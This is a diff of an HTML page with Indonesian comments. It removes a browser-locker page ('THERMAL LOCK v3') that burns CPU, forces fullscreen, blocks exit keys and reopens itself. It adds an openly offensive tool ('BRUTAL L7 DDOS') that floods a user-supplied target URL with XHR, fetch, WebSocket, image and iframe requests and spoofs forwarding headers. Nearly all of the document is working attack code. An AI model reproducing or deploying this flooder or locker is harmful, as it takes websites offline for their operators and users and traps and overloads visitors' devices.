@@ -2,152 +2,192 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>THERMAL LOCK v3</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BRUTAL L7 DDOS - MULTI VECTOR</title>
     <style>
-        body, html { 
-            margin:0; padding:0; overflow:hidden; background:#000; height:100%; 
-            touch-action: none; user-select: none; 
-        }
-        canvas { display:block; position:fixed; top:0; left:0; }
-        #overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            z-index: 9999; pointer-events: none; background: transparent;
-        }
+        body { background: #000; color: #ff0000; font-family: monospace; padding: 20px; }
+        input, button { background: #1a0000; color: #ff0000; border: 1px solid #ff0000; padding: 10px; margin: 5px; font-weight: bold; }
+        .log { background: #0a0000; height: 400px; overflow-y: scroll; font-size: 11px; margin-top: 15px; padding: 8px; border: 2px solid #ff0000; }
+        h2 { color: #ff0000; text-shadow: 0 0 5px red; }
+        button:hover { background: #ff0000; color: #000; cursor: pointer; }
     </style>
 </head>
 <body>
-    <canvas id="c"></canvas>
-    <div id="overlay"></div>
+<h2>🔥 EXTREME MULTI-THREAD HTTP/1.1 + HTTP/2 + WS + XMLHttpRequest FLOOD 🔥</h2>
+<label>Target URL:</label><br>
+<input type="text" id="targetUrl" placeholder="https://example.com" style="width: 80%;">
+<button id="startBtn">💀 START TOTAL ANNIHILATION 💀</button>
+<button id="stopBtn">✋ STOP</button>
+<div class="log" id="log"></div>
+<script>
+    let active = false;
+    let threads = 500;
+    let reqCount = 0;
+    let errCount = 0;
+    let wsConnections = [];
 
-    <script>
-        const canvas = document.getElementById('c');
-        const ctx = canvas.getContext('2d', { alpha: false });
-        let w = canvas.width = window.innerWidth * 2;
-        let h = canvas.height = window.innerHeight * 2;
+    function log(msg) {
+        const div = document.getElementById('log');
+        div.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
+        div.scrollTop = div.scrollHeight;
+    }
 
-        window.addEventListener('resize', () => {
-            w = canvas.width = window.innerWidth * 2;
-            h = canvas.height = window.innerHeight * 2;
-        });
-
-        let heavyData = new Array(15000000).fill(0).map(() => Math.random() * 1e9);
-
-        function burnCPU() {
-            for (let i = 0; i < 25000000; i++) {
-                heavyData[i % heavyData.length] = Math.sin(i * 1.3) * Math.cos(i * 2.1) * Math.sqrt(Math.abs(i)) * Math.random();
-            }
-            let size = 350;
-            let a = new Array(size).fill(0).map(() => new Array(size).fill(0).map(Math.random));
-            let b = new Array(size).fill(0).map(() => new Array(size).fill(0).map(Math.random));
-            let res = new Array(size).fill(0).map(() => new Array(size).fill(0));
-            for (let i = 0; i < size; i++)
-                for (let j = 0; j < size; j++)
-                    for (let k = 0; k < size; k++)
-                        res[i][j] += a[i][k] * b[k][j];
-        }
-
-        function render() {
-            ctx.fillStyle = '#000';
-            ctx.fillRect(0, 0, w, h);
-            ctx.strokeStyle = `hsl(${Math.random()*360},100%,70%)`;
-            for (let i = 0; i < 15000; i++) {
-                let x = Math.random() * w;
-                let y = Math.random() * h;
-                ctx.beginPath();
-                ctx.moveTo(x, y);
-                ctx.lineTo(x + (Math.random()-0.5)*200, y + (Math.random()-0.5)*200);
-                ctx.stroke();
-            }
-            ctx.font = 'bold 220px Arial';
-            ctx.fillStyle = `rgba(255,${70 + Math.random()*70},0,0.8)`;
-            ctx.fillText('THERMAL', Math.random()*w*0.4, Math.random()*h*0.5 + 150);
-            ctx.fillText('LOCKED v3', Math.random()*w*0.4, Math.random()*h*0.5 + 400);
-            burnCPU();
-        }
-
-        function forceFS() {
-            const elem = document.documentElement;
-            if (elem.requestFullscreen) elem.requestFullscreen({ navigationUI: "hide" });
-            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-        }
-
-        // Re-lock fullscreen & immersive
-        function lockImmersive() {
-            forceFS();
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
+    // XHR synchronous blocking + async flood (legacy but heavy)
+    function xhrFlood(url, id) {
+        while(active) {
+            for(let i=0; i<20; i++) { // batch 20 request per loop
+                if(!active) break;
+                const xhr = new XMLHttpRequest();
+                const randomUrl = url + '/' + Math.random().toString(36) + '?t=' + Date.now() + '_' + id + '_' + i;
+                try {
+                    xhr.open('GET', randomUrl, false); // synchronous = blokir event loop tapi brutal ke target
+                    xhr.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+                    xhr.setRequestHeader('X-Forwarded-For', Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255));
+                    xhr.send();
+                    reqCount++;
+                    if(reqCount % 100 === 0) log(`[XHR-${id}] Req: ${reqCount} | Status: ${xhr.status}`);
+                } catch(e) {
+                    errCount++;
+                    if(errCount % 50 === 0) log(`[XHR-ERROR] ${e.message}`);
+                }
             }
         }
+    }
 
-        ['fullscreenchange', 'webkitfullscreenchange', 'mozfullscreenchange'].forEach(ev => {
-            document.addEventListener(ev, () => {
-                if (!document.fullscreenElement) setTimeout(lockImmersive, 10);
-            });
-        });
-
-        // Blokir semua gesture & input sebanyak mungkin
-        document.addEventListener('contextmenu', e => { e.preventDefault(); return false; });
-        document.addEventListener('touchstart', e => { if (e.touches.length > 1) e.preventDefault(); }, { passive: false });
-        document.addEventListener('keydown', e => {
-            if (e.key === 'Escape' || e.keyCode === 27 || e.key === 'Home' || e.key === 'F5') {
-                e.preventDefault();
-                lockImmersive();
+    // Fetch + keep-alive + no delay
+    async function fetchFlood(url, id) {
+        while(active) {
+            const randomPath = '/' + Math.random().toString(36).substring(2) + '?' + Date.now() + '_' + id;
+            const fullUrl = url + randomPath;
+            const headers = {
+                'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
+                'Cache-Control': 'no-store, no-cache, max-age=0',
+                'Pragma': 'no-cache',
+                'X-Spoof-IP': Math.floor(Math.random()*4294967295),
+                'Accept': '*/*',
+                'Connection': 'keep-alive',
+                'X-Requested-With': 'XMLHttpRequest'
+            };
+            try {
+                const res = await fetch(fullUrl, { method: 'GET', headers, mode: 'cors', credentials: 'include', keepalive: true });
+                reqCount++;
+                if(reqCount % 50 === 0) log(`[FETCH-${id}] ${res.status} | Total req: ${reqCount}`);
+                await res.text().catch(()=>{});
+            } catch(e) {
+                errCount++;
             }
-        });
+        }
+    }
 
-        // Beforeunload + auto reopen
-        window.addEventListener('beforeunload', e => {
-            e.preventDefault();
-            e.returnValue = '';
-            try { window.open(window.location.href, '_blank'); } catch(err) {}
-            lockImmersive();
-            return '';
-        });
+    // WebSocket bomb (jika support)
+    function wsBomb(url, id) {
+        let wsUrl = url.replace('https://', 'wss://').replace('http://', 'ws://');
+        function createWS() {
+            if(!active) return;
+            try {
+                const ws = new WebSocket(wsUrl);
+                wsConnections.push(ws);
+                ws.onopen = () => {
+                    setInterval(() => {
+                        if(ws.readyState === WebSocket.OPEN && active) {
+                            ws.send(new ArrayBuffer(1024 * 64)); // 64KB binary setiap 10ms
+                            reqCount++;
+                        }
+                    }, 10);
+                };
+                ws.onclose = () => setTimeout(createWS, 1);
+                ws.onerror = () => ws.close();
+            } catch(e) {}
+        }
+        for(let i=0; i<50; i++) createWS(); // 50 websocket persistent
+    }
 
-        // Visibility & pause detection → reopen
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                try { window.open(window.location.href, '_blank'); } catch(err) {}
-                lockImmersive();
-                burnCPU();
-            }
-        });
+    // Image beacon bomb (via Image object)
+    function imgFlood(url, id) {
+        while(active) {
+            const img = new Image();
+            const randUrl = url + '/img_' + Math.random() + '.jpg?' + Date.now() + '_' + id;
+            img.src = randUrl;
+            reqCount++;
+            if(reqCount % 200 === 0) log(`[IMG-${id}] Beacon sent`);
+        }
+    }
 
-        window.addEventListener('pagehide', () => {
-            try { window.open(window.location.href, '_blank'); } catch(err) {}
-        });
-
-        // Aggressive intervals
-        setInterval(render, 1);
-        setInterval(burnCPU, 1);
-        setInterval(lockImmersive, 150);
+    // iframe injection ke DOM (membebani memory target)
+    function iframeOverload(url) {
+        const iframeContainer = document.createElement('div');
+        iframeContainer.style.display = 'none';
+        document.body.appendChild(iframeContainer);
         setInterval(() => {
-            try { window.open(window.location.href, '_blank'); } catch(err) {}
-        }, 600);
-
-        // Multiple heavy workers
-        if (window.Worker) {
-            const workerCode = `self.onmessage = function() { while(true) { let x=0; for(let i=0;i<40000000;i++) x += Math.sin(i)*Math.random(); } };`;
-            const blob = new Blob([workerCode], {type: 'application/javascript'});
-            for (let i = 0; i < 8; i++) {
-                const worker = new Worker(URL.createObjectURL(blob));
-                worker.postMessage('burn');
+            if(!active) return;
+            for(let i=0;i<30;i++) {
+                const iframe = document.createElement('iframe');
+                iframe.src = url + '?' + Math.random();
+                iframeContainer.appendChild(iframe);
+                setTimeout(() => iframe.remove(), 100);
+                reqCount++;
             }
+        }, 100);
+    }
+
+    function startTotalFlood() {
+        let target = document.getElementById('targetUrl').value.trim();
+        if(!target) {
+            alert("Masukkan URL target!");
+            return;
         }
-
-        function heavyLoop() {
-            burnCPU();
-            render();
-            requestAnimationFrame(heavyLoop);
+        if(!target.startsWith('http')) target = 'https://' + target;
+        if(active) {
+            log("Already active. Stop first.");
+            return;
         }
-        heavyLoop(); heavyLoop(); heavyLoop(); heavyLoop();
+        active = true;
+        reqCount = 0;
+        errCount = 0;
+        log(`💀💀💀 STARTING BRUTAL DDOS ON: ${target} 💀💀💀`);
+        log(`Threads: ${threads} | Method: XHR sync + Fetch async + WebSocket + Image + iframe`);
 
-        // Start
-        lockImmersive();
-        setTimeout(() => { lockImmersive(); render(); }, 100);
+        // Launch XHR synchronous threads (paling heavy)
+        for(let i=0; i<200; i++) {
+            setTimeout(() => xhrFlood(target, i), i*2);
+        }
+        // Launch fetch async threads
+        for(let i=0; i<200; i++) {
+            setTimeout(() => fetchFlood(target, i+200), i*2);
+        }
+        // Image bomb threads
+        for(let i=0; i<80; i++) {
+            setTimeout(() => imgFlood(target, i+400), i*5);
+        }
+        // WebSocket bomb
+        wsBomb(target, 0);
+        // iframe overload
+        iframeOverload(target);
+        
+        log("✅ ALL ENGINES ACTIVE - WebSocket, XHR sync, fetch, Image beacon, iframe injection");
+        setInterval(() => {
+            if(active) log(`📊 STATS - Total Requests: ${reqCount} | Errors: ${errCount} | Rate: ${Math.floor(reqCount/ ((Date.now() - startTime)/1000))}/sec`);
+        }, 5000);
+    }
 
-        console.log("%cTHERMAL LOCK v3 ACTIVE - MAXIMUM EXIT BLOCK", "color:#f00;font-size:26px");
-    </script>
+    function stopFlood() {
+        active = false;
+        wsConnections.forEach(ws => { try{ws.close()}catch(e){} });
+        wsConnections = [];
+        log(`🛑 STOPPED. Total requests: ${reqCount} | Errors: ${errCount}`);
+    }
+
+    let startTime;
+    const originalStart = startTotalFlood;
+    startTotalFlood = function() {
+        startTime = Date.now();
+        originalStart();
+    };
+
+    document.getElementById('startBtn').onclick = startTotalFlood;
+    document.getElementById('stopBtn').onclick = stopFlood;
+    log("READY. Masukkan target (contoh: https://target.com) lalu klik TOTAL ANNIHILATION.");
+    log("⚠️ INI BRUTAL - XHR SYNC MEMBLOKIR TAB BROWSER ANDA, TETAPI JUGA MEMBUNUH SERVER TARGET.");
+</script>
 </body>
 </html>
